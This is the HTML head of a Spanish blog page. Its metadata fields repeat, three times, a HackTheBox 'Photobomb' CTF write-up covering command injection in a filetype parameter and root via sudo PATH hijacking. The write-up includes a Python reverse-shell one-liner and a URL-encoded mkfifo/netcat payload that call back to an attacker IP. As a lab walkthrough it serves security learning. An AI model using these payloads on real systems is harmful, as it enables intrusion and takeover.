<!DOCTYPE html>













<html lang="es-ES"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Allow having a localized datetime different from the appearance language -->
  

  

    

    

  

  

  
    

    
      
        <!-- `site.img_cdn` is a local file path -->
        
        
      

      

    
      
        <!-- `site.img_cdn` is a local file path -->
        
        
      

      

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="Photobomb WriteUp" />
<meta name="author" content="H4ckerLite" />
<meta property="og:locale" content="es_ES" />
<meta name="description" content="Hoy tocará explotar la máquina Photobomb de HackTheBox, es de dificultad fácil. Haremos un command injection y para la escalada haremos un Path Hijacking Escaneo NMAP Antes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 13:24 -04 Initiating SYN Stealth Scan at 13:24 Scanning 10.10.11.182 [65535 ports] Discovered open port 80/tcp on 10.10.11.182 Discovered open port 22/tcp on 10.10.11.182 Completed SYN Stealth Scan at 13:24, 17.92s elapsed (65535 total ports) Nmap scan report for 10.10.11.182 Host is up, received user-set (0.16s latency). Scanned at 2023-02-04 13:24:12 -04 for 18s Not shown: 61907 closed tcp ports (reset), 3626 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 18.08 seconds Raw packets sent: 87248 (3.839MB) | Rcvd: 67894 (2.716MB) Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente: 1 echo &quot;10.10.11.182 photobomb.htb&quot; | tee -a /etc/hosts Enumeración Vemos una pagina de inicio con un redirect a /printer Web Site Si intentamos acceder nos pedirá credenciales Log in Podemos probar credenciales típicas por defecto, pero no resultará útil. 1 2 3 4 5 admin:admin admin:password admin:pass guest:guest Si revisamos el código fuente nos encontramos con cosaas interesantes. Le aplicamos un curl. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ❯ curl -s -X GET http://photobomb.htb &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Photobomb&lt;/title&gt; &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;styles.css&quot; media=&quot;all&quot; /&gt; &lt;script src=&quot;photobomb.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;container&quot;&gt; &lt;header&gt; &lt;h1&gt;&lt;a href=&quot;/&quot;&gt;Photobomb&lt;/a&gt;&lt;/h1&gt; &lt;/header&gt; &lt;article&gt; &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt; &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt; &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt; &lt;p&gt;To get started, please &lt;a href=&quot;/printer&quot; class=&quot;creds&quot;&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt; &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt; &lt;/article&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; Podemos ver un script de JavaScript, si vemos su contenido se nos filtra una cookie 1 2 3 4 5 6 7 8 ❯ curl -s -X GET http://photobomb.htb/photobomb.js function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) { document.getElementsByClassName(&#39;creds&#39;)[0].setAttribute(&#39;href&#39;,&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;); } } window.onload = init; Al copiar dicha cookie, podemos ver el panel /printer. Log in Explotación En este apartado vemos unas imagenes las cuales podemos descargar y hacer pequeñas modificaciones como ser: Cambiarle la extensión y modicar el tamaño. Printer Podemos interceptar la petición con BurpSuite y ver mas a detalles como se estructura todo BurpSuite Podemos ver si es vulnerable a un Command injection, pero antes que nada inicia un servidor con python 1 python -m http.server 80 Mandamos la petición al Repeater, para ello presionamos Ctrl + R Si nos fijamos en los parametros podemos agregar ; y añadir nuestro comando, se vería así BurpSuite Podemos ver que no le gusta en algunos parametros, pero con haciendo prueba y error encontramos que el parametro filetype es vulnerable, lo podemos comprobar en la petición 1 2 3 ❯ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.182 - - [04/Feb/2023 14:45:12] &quot;GET / HTTP/1.1&quot; 200 - Podemos intentar enviarnos una reverse shell, usano esta página podemos hacer la reverse shell con varias opciones. Probaremos con bash pero no funciona, así que podemos probar con python3 y esta nos lanzará la shell 1 export RHOST=&quot;10.10.14.25&quot;;export RPORT=444;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#39; RCE Nota: Si usas nc mkfifo y url encode te lanzará la shell igual 1 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.25%20444%20%3E%2Ftmp%2Ff Ganamos acceso a la máquina, estamos listos para rootearla 1 2 3 4 ❯ nc -lvnp 444 listening on [any] 444 ... connect to [10.10.14.25] from (UNKNOWN) [10.10.11.182] 49946 wizard@photobomb:~/photobomb$ Toca realizar un tratamiento a la tty, te puedes guiar de mi blog. Una vez adentro podemos leer la primera flag 1 2 3 wizard@photobomb:~/photobomb$ cat ../user.txt 06****************************78 wizard@photobomb:~/photobomb$ Escalada de privilegios Si vemos los privilegios SUDOERS vemos que podemos ejecutar un programa hecho en bash 1 2 3 4 5 6 7 8 wizard@photobomb:~/photobomb$ sudo -l Matching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.sh wizard@photobomb:~/photobomb$ Vemos que lo podemos ejecutar sin proporcionar ninguna contraseña, es decir que al ejecuralo como sudo sera ejecutado de forma temporal como root sin proporcionar contraseña 1 2 wizard@photobomb:~/photobomb$ sudo /opt/cleanup.sh wizard@photobomb:~/photobomb$ Si vemos el contenido de dicho archivo nos encontramos con binarios que podemos usar para elevar nuestros privilegios. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh #!/bin/bash . /opt/.bashrc cd /home/wizard/photobomb # clean up log files if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ] then /bin/cat log/photobomb.log &gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.log fi # protect the priceless originals find source_images -type f -name &#39;*.jpg&#39; -exec chown root:root {} \; wizard@photobomb:~/photobomb$ Vemos que el binario find esta con ruta relativa no absoluta y esto puede derivar a un Path Hijacking, Podemos aprovechar que podemos cambiar variables de entorno como el Path para que nos ejecute el comando find personalizado, y bajo el contexto de sudo nuestro binario find lo ejecutará root. 1 2 3 4 5 6 wizard@photobomb:/tmp$ echo bash &gt; find wizard@photobomb:/tmp$ chmod 777 find wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh wizard@photobomb:/tmp$ ls -l /bin/bash root@photobomb:/home/wizard/photobomb# Ya rooteamos la máquina, lo que hicimos fue hacer un binario perzonalizado find que nos lanze una bash como root, en este caso, ya que el esta ejecutando el /opt/cleanup.sh con el binario find de forma relativa. Procedemos a leer la flag 1 2 3 root@photobomb:/home/wizard/photobomb# cat /root/root.txt 74****************************35 root@photobomb:/home/wizard/photobomb# ¡¡¡Máquina Pwneada!!! Te deseo un Feliz Hackeo." />
<meta property="og:description" content="Hoy tocará explotar la máquina Photobomb de HackTheBox, es de dificultad fácil. Haremos un command injection y para la escalada haremos un Path Hijacking Escaneo NMAP Antes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 13:24 -04 Initiating SYN Stealth Scan at 13:24 Scanning 10.10.11.182 [65535 ports] Discovered open port 80/tcp on 10.10.11.182 Discovered open port 22/tcp on 10.10.11.182 Completed SYN Stealth Scan at 13:24, 17.92s elapsed (65535 total ports) Nmap scan report for 10.10.11.182 Host is up, received user-set (0.16s latency). Scanned at 2023-02-04 13:24:12 -04 for 18s Not shown: 61907 closed tcp ports (reset), 3626 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 18.08 seconds Raw packets sent: 87248 (3.839MB) | Rcvd: 67894 (2.716MB) Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente: 1 echo &quot;10.10.11.182 photobomb.htb&quot; | tee -a /etc/hosts Enumeración Vemos una pagina de inicio con un redirect a /printer Web Site Si intentamos acceder nos pedirá credenciales Log in Podemos probar credenciales típicas por defecto, pero no resultará útil. 1 2 3 4 5 admin:admin admin:password admin:pass guest:guest Si revisamos el código fuente nos encontramos con cosaas interesantes. Le aplicamos un curl. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ❯ curl -s -X GET http://photobomb.htb &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Photobomb&lt;/title&gt; &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;styles.css&quot; media=&quot;all&quot; /&gt; &lt;script src=&quot;photobomb.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;container&quot;&gt; &lt;header&gt; &lt;h1&gt;&lt;a href=&quot;/&quot;&gt;Photobomb&lt;/a&gt;&lt;/h1&gt; &lt;/header&gt; &lt;article&gt; &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt; &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt; &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt; &lt;p&gt;To get started, please &lt;a href=&quot;/printer&quot; class=&quot;creds&quot;&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt; &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt; &lt;/article&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; Podemos ver un script de JavaScript, si vemos su contenido se nos filtra una cookie 1 2 3 4 5 6 7 8 ❯ curl -s -X GET http://photobomb.htb/photobomb.js function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) { document.getElementsByClassName(&#39;creds&#39;)[0].setAttribute(&#39;href&#39;,&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;); } } window.onload = init; Al copiar dicha cookie, podemos ver el panel /printer. Log in Explotación En este apartado vemos unas imagenes las cuales podemos descargar y hacer pequeñas modificaciones como ser: Cambiarle la extensión y modicar el tamaño. Printer Podemos interceptar la petición con BurpSuite y ver mas a detalles como se estructura todo BurpSuite Podemos ver si es vulnerable a un Command injection, pero antes que nada inicia un servidor con python 1 python -m http.server 80 Mandamos la petición al Repeater, para ello presionamos Ctrl + R Si nos fijamos en los parametros podemos agregar ; y añadir nuestro comando, se vería así BurpSuite Podemos ver que no le gusta en algunos parametros, pero con haciendo prueba y error encontramos que el parametro filetype es vulnerable, lo podemos comprobar en la petición 1 2 3 ❯ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.182 - - [04/Feb/2023 14:45:12] &quot;GET / HTTP/1.1&quot; 200 - Podemos intentar enviarnos una reverse shell, usano esta página podemos hacer la reverse shell con varias opciones. Probaremos con bash pero no funciona, así que podemos probar con python3 y esta nos lanzará la shell 1 export RHOST=&quot;10.10.14.25&quot;;export RPORT=444;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#39; RCE Nota: Si usas nc mkfifo y url encode te lanzará la shell igual 1 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.25%20444%20%3E%2Ftmp%2Ff Ganamos acceso a la máquina, estamos listos para rootearla 1 2 3 4 ❯ nc -lvnp 444 listening on [any] 444 ... connect to [10.10.14.25] from (UNKNOWN) [10.10.11.182] 49946 wizard@photobomb:~/photobomb$ Toca realizar un tratamiento a la tty, te puedes guiar de mi blog. Una vez adentro podemos leer la primera flag 1 2 3 wizard@photobomb:~/photobomb$ cat ../user.txt 06****************************78 wizard@photobomb:~/photobomb$ Escalada de privilegios Si vemos los privilegios SUDOERS vemos que podemos ejecutar un programa hecho en bash 1 2 3 4 5 6 7 8 wizard@photobomb:~/photobomb$ sudo -l Matching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.sh wizard@photobomb:~/photobomb$ Vemos que lo podemos ejecutar sin proporcionar ninguna contraseña, es decir que al ejecuralo como sudo sera ejecutado de forma temporal como root sin proporcionar contraseña 1 2 wizard@photobomb:~/photobomb$ sudo /opt/cleanup.sh wizard@photobomb:~/photobomb$ Si vemos el contenido de dicho archivo nos encontramos con binarios que podemos usar para elevar nuestros privilegios. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh #!/bin/bash . /opt/.bashrc cd /home/wizard/photobomb # clean up log files if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ] then /bin/cat log/photobomb.log &gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.log fi # protect the priceless originals find source_images -type f -name &#39;*.jpg&#39; -exec chown root:root {} \; wizard@photobomb:~/photobomb$ Vemos que el binario find esta con ruta relativa no absoluta y esto puede derivar a un Path Hijacking, Podemos aprovechar que podemos cambiar variables de entorno como el Path para que nos ejecute el comando find personalizado, y bajo el contexto de sudo nuestro binario find lo ejecutará root. 1 2 3 4 5 6 wizard@photobomb:/tmp$ echo bash &gt; find wizard@photobomb:/tmp$ chmod 777 find wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh wizard@photobomb:/tmp$ ls -l /bin/bash root@photobomb:/home/wizard/photobomb# Ya rooteamos la máquina, lo que hicimos fue hacer un binario perzonalizado find que nos lanze una bash como root, en este caso, ya que el esta ejecutando el /opt/cleanup.sh con el binario find de forma relativa. Procedemos a leer la flag 1 2 3 root@photobomb:/home/wizard/photobomb# cat /root/root.txt 74****************************35 root@photobomb:/home/wizard/photobomb# ¡¡¡Máquina Pwneada!!! Te deseo un Feliz Hackeo." />
<link rel="canonical" href="http://localhost:4000/posts/photobomb-writeup/" />
<meta property="og:url" content="http://localhost:4000/posts/photobomb-writeup/" />
<meta property="og:site_name" content="H4ckerLite Blog" />
<meta property="og:image" content="http://localhost:4000/assets/img/commons/photoBomb-writeup/Photobomb.png" />
<meta property="og:image:alt" content="Photobomb WriteUp" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-02-03T17:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/commons/photoBomb-writeup/Photobomb.png" />
<meta name="twitter:image:alt" content="Photobomb WriteUp" />
<meta property="twitter:title" content="Photobomb WriteUp" />
<meta name="twitter:site" content="@mortzelo" />
<meta name="twitter:creator" content="@H4ckerLite" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-03-26T23:57:43+02:00","datePublished":"2023-02-03T17:00:00+01:00","description":"Hoy tocará explotar la máquina Photobomb de HackTheBox, es de dificultad fácil. Haremos un command injection y para la escalada haremos un Path Hijacking Escaneo NMAP Antes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 13:24 -04 Initiating SYN Stealth Scan at 13:24 Scanning 10.10.11.182 [65535 ports] Discovered open port 80/tcp on 10.10.11.182 Discovered open port 22/tcp on 10.10.11.182 Completed SYN Stealth Scan at 13:24, 17.92s elapsed (65535 total ports) Nmap scan report for 10.10.11.182 Host is up, received user-set (0.16s latency). Scanned at 2023-02-04 13:24:12 -04 for 18s Not shown: 61907 closed tcp ports (reset), 3626 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 18.08 seconds Raw packets sent: 87248 (3.839MB) | Rcvd: 67894 (2.716MB) Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente: 1 echo &quot;10.10.11.182 photobomb.htb&quot; | tee -a /etc/hosts Enumeración Vemos una pagina de inicio con un redirect a /printer Web Site Si intentamos acceder nos pedirá credenciales Log in Podemos probar credenciales típicas por defecto, pero no resultará útil. 1 2 3 4 5 admin:admin admin:password admin:pass guest:guest Si revisamos el código fuente nos encontramos con cosaas interesantes. Le aplicamos un curl. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ❯ curl -s -X GET http://photobomb.htb &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Photobomb&lt;/title&gt; &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;styles.css&quot; media=&quot;all&quot; /&gt; &lt;script src=&quot;photobomb.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;container&quot;&gt; &lt;header&gt; &lt;h1&gt;&lt;a href=&quot;/&quot;&gt;Photobomb&lt;/a&gt;&lt;/h1&gt; &lt;/header&gt; &lt;article&gt; &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt; &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt; &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt; &lt;p&gt;To get started, please &lt;a href=&quot;/printer&quot; class=&quot;creds&quot;&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt; &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt; &lt;/article&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; Podemos ver un script de JavaScript, si vemos su contenido se nos filtra una cookie 1 2 3 4 5 6 7 8 ❯ curl -s -X GET http://photobomb.htb/photobomb.js function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) { document.getElementsByClassName(&#39;creds&#39;)[0].setAttribute(&#39;href&#39;,&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;); } } window.onload = init; Al copiar dicha cookie, podemos ver el panel /printer. Log in Explotación En este apartado vemos unas imagenes las cuales podemos descargar y hacer pequeñas modificaciones como ser: Cambiarle la extensión y modicar el tamaño. Printer Podemos interceptar la petición con BurpSuite y ver mas a detalles como se estructura todo BurpSuite Podemos ver si es vulnerable a un Command injection, pero antes que nada inicia un servidor con python 1 python -m http.server 80 Mandamos la petición al Repeater, para ello presionamos Ctrl + R Si nos fijamos en los parametros podemos agregar ; y añadir nuestro comando, se vería así BurpSuite Podemos ver que no le gusta en algunos parametros, pero con haciendo prueba y error encontramos que el parametro filetype es vulnerable, lo podemos comprobar en la petición 1 2 3 ❯ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.182 - - [04/Feb/2023 14:45:12] &quot;GET / HTTP/1.1&quot; 200 - Podemos intentar enviarnos una reverse shell, usano esta página podemos hacer la reverse shell con varias opciones. Probaremos con bash pero no funciona, así que podemos probar con python3 y esta nos lanzará la shell 1 export RHOST=&quot;10.10.14.25&quot;;export RPORT=444;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#39; RCE Nota: Si usas nc mkfifo y url encode te lanzará la shell igual 1 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.25%20444%20%3E%2Ftmp%2Ff Ganamos acceso a la máquina, estamos listos para rootearla 1 2 3 4 ❯ nc -lvnp 444 listening on [any] 444 ... connect to [10.10.14.25] from (UNKNOWN) [10.10.11.182] 49946 wizard@photobomb:~/photobomb$ Toca realizar un tratamiento a la tty, te puedes guiar de mi blog. Una vez adentro podemos leer la primera flag 1 2 3 wizard@photobomb:~/photobomb$ cat ../user.txt 06****************************78 wizard@photobomb:~/photobomb$ Escalada de privilegios Si vemos los privilegios SUDOERS vemos que podemos ejecutar un programa hecho en bash 1 2 3 4 5 6 7 8 wizard@photobomb:~/photobomb$ sudo -l Matching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.sh wizard@photobomb:~/photobomb$ Vemos que lo podemos ejecutar sin proporcionar ninguna contraseña, es decir que al ejecuralo como sudo sera ejecutado de forma temporal como root sin proporcionar contraseña 1 2 wizard@photobomb:~/photobomb$ sudo /opt/cleanup.sh wizard@photobomb:~/photobomb$ Si vemos el contenido de dicho archivo nos encontramos con binarios que podemos usar para elevar nuestros privilegios. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh #!/bin/bash . /opt/.bashrc cd /home/wizard/photobomb # clean up log files if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ] then /bin/cat log/photobomb.log &gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.log fi # protect the priceless originals find source_images -type f -name &#39;*.jpg&#39; -exec chown root:root {} \\; wizard@photobomb:~/photobomb$ Vemos que el binario find esta con ruta relativa no absoluta y esto puede derivar a un Path Hijacking, Podemos aprovechar que podemos cambiar variables de entorno como el Path para que nos ejecute el comando find personalizado, y bajo el contexto de sudo nuestro binario find lo ejecutará root. 1 2 3 4 5 6 wizard@photobomb:/tmp$ echo bash &gt; find wizard@photobomb:/tmp$ chmod 777 find wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh wizard@photobomb:/tmp$ ls -l /bin/bash root@photobomb:/home/wizard/photobomb# Ya rooteamos la máquina, lo que hicimos fue hacer un binario perzonalizado find que nos lanze una bash como root, en este caso, ya que el esta ejecutando el /opt/cleanup.sh con el binario find de forma relativa. Procedemos a leer la flag 1 2 3 root@photobomb:/home/wizard/photobomb# cat /root/root.txt 74****************************35 root@photobomb:/home/wizard/photobomb# ¡¡¡Máquina Pwneada!!! Te deseo un Feliz Hackeo.","headline":"Photobomb WriteUp","image":{"alt":"Photobomb WriteUp","url":"http://localhost:4000/assets/img/commons/photoBomb-writeup/Photobomb.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/photobomb-writeup/"},"url":"http://localhost:4000/posts/photobomb-writeup/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Photobomb WriteUp | H4ckerLite | Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="H4ckerLite | Blog">
<meta name="application-name" content="H4ckerLite | Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
    <!--
  Switch the mode between dark and light.
-->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get MODE_ATTR() { return "data-mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }
    static get ID() { return "mode-toggle"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener("change", () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();

      });

    } /* constructor() */

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
